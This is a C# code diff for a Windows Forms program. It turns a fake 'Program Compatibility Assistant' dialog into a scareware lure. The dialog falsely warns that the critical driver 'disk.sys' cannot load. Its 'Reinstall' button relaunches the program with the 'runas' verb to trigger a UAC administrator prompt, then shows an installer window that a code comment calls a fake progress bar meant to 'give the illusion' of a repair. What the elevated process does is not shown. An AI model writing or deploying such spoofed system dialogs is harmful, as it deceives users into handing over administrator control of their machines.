@@ -1,18 +1,22 @@
 using StartPrompt; // import my custom namespace
+using SysView;
 
 using System;
 using System.Drawing;
 using Microsoft.Win32;
+using System.Threading;
+using System.Diagnostics;
 using System.Windows.Forms;
 using System.Drawing.Drawing2D;
 
 public class DiversionPrompt : Form
 {
+    SystemData sd = new SystemData();
     bool lightMode;
 
     public DiversionPrompt()
     {
-        lightMode = UsingLightTheme();
+        lightMode = sd.UsingLightTheme();
 
         this.Text = "Program Compatibility Assistant";
         this.FormBorderStyle = FormBorderStyle.FixedDialog;
@@ -41,7 +45,7 @@ public class DiversionPrompt : Form
         // Error Info
         Label driverInfo = new Label
         {
-            Text = "Driver: ene.sys\nene.sys\n\nWindows cannot load "+
+            Text = "Driver: disk.sys\ndisk.sys\n\nWindows cannot load "+
                    "this critical driver and requires reinstall.\n"+
                    "You'll need to reinstall this driver or your device may become unstable!",
             Font = new Font("Segoe UI", 9),
@@ -67,26 +71,26 @@ public class DiversionPrompt : Form
         learnMore.Click += (s, e) => MessageBox.Show("Redirecting to help page...");
         this.Controls.Add(learnMore);
 
-        CurvedButton cancel = new CurvedButton(5, 2);
-        cancel.Text = "Reinstall";
-        cancel.Location = new Point(230, 210);
-        cancel.Size = new Size(185, 30);
-        cancel.FlatStyle = FlatStyle.Flat;
+        CurvedButton reinstallButton = new CurvedButton(5, 2);
+        reinstallButton.Text = "Reinstall";
+        reinstallButton.Location = new Point(230, 210);
+        reinstallButton.Size = new Size(185, 30);
+        reinstallButton.FlatStyle = FlatStyle.Flat;
         
         if (!lightMode)
         {
-            cancel.BackColor = Color.FromArgb(64, 64, 64);
-            cancel.ForeColor = Color.White;
+            reinstallButton.BackColor = Color.FromArgb(64, 64, 64);
+            reinstallButton.ForeColor = Color.White;
         }
 
         // Add event handlers for mouse and keyboard interactions
-        cancel.MouseEnter += ButtonOnFocus;
-        cancel.MouseLeave += ButtonOffFocus;
-        cancel.GotFocus += ButtonOnFocus;
-        cancel.LostFocus += ButtonOffFocus;
+        reinstallButton.MouseEnter += ButtonOnFocus;
+        reinstallButton.MouseLeave += ButtonOffFocus;
+        reinstallButton.GotFocus += ButtonOnFocus;
+        reinstallButton.LostFocus += ButtonOffFocus;
 
-        cancel.Click += (s, e) => this.Close();
-        this.Controls.Add(cancel);
+        reinstallButton.Click += ReinstallDriver;
+        this.Controls.Add(reinstallButton);
     }
 
 //==============================================================================
@@ -111,28 +115,39 @@ public class DiversionPrompt : Form
         b.borderColor = Color.Transparent;
     }
 
-    bool UsingLightTheme()
-    {
+    // Create a fake progress bar to give the illusion that we are reinstalling
+    // the driver and its dependencies
+    void ReinstallDriver(object sender, EventArgs e) {
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = Application.ExecutablePath,
+            Arguments = "--repair",
+            Verb = "runas", // triggers UAC to elevate privs
+            UseShellExecute = true,
+            WindowStyle = ProcessWindowStyle.Minimized
+        };
+
         try
         {
-            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Themes\Personalize"))
-            {
-                if (key != null)
-                {
-                    object value = key.GetValue("AppsUseLightTheme");
-                    if (value is int themeValue)
-                    {
-                        return themeValue == 1;
-                    }
-                }
-            }
-        } catch (Exception)
-            {
-                // Default Fallback
-                return true;
-            }
+            Process.Start(psi);
 
-        return true;
+            Thread.Sleep(500);
+
+            Thread t = new Thread(new ThreadStart(InstallerForm));
+            t.Start();
+
+            // kill diversion prompt so only one form is up at a time for now
+            this.Close();
+        } catch
+            {
+                // User probably clicked "No" on the UAC prompt
+                Console.WriteLine("User denied elevation.");
+            }
+    }
+
+    void InstallerForm() {
+        InstallerPrompt iP = new InstallerPrompt();
+        iP.ShowDialog();
     }
 
     // This method provides external objects to trigger this winform
